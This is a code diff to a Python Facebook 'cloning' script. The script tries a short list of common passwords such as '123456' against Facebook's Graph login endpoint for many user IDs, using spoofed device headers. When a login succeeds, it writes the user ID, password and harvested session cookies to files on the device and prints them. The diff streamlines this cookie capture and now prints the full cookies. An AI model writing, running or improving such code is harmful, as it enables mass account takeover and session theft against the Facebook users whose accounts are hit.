@@ -409,7 +409,7 @@ def login1(uid):
         )
         sys.stdout.flush()
         ua = random.choice(ugen)
-        for pw in ["123456","1234567","12345678","123456789","1234567890","123123","abc123"]:
+        for pw in ["123456","1234567","12345678","123456789","1234567890","123123"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -448,29 +448,25 @@ def login1(uid):
             'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
             'Content-Length': '706'}
             url = "https://b-graph.facebook.com/auth/login"
-            response = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True)
-            
-            # Get cookies from response
-            cookies = get_cookies(response)
-            
-            rp = response.json()
+            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:
+                cookies = ";".join([f"{i['name']}={i['value']}" for i in rp.get('session_cookies', [])])
                 oks.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
-                print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw} ● {cookies[:50]}...\033[1;97m')
+                print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
                 break
 
-            elif "www.facebook.com" in rp['error']['message']:
+            elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
+                cookies = ";".join([f"{i.get('name')}={i.get('value')}" for i in rp.get('session_cookies', [])]) if "session_cookies" in rp else "NO-COOKIE"
                 cps.append(uid)
-                open("/sdcard/OLD_CLONING-CP.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
-                print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw} ● {cookies[:50]}...\033[1;97m')             
+                open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
+                print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
                 break
-            else:continue
-        loop+=1
-    except Exception as e:time.sleep(30)
 
+            else:
+                continue
+        loop += 1
+    except Exception as e:
+        time.sleep(5)
 if __name__ == "__main__":
     main()
-
-if __name__ == "__main__":
-    main()		
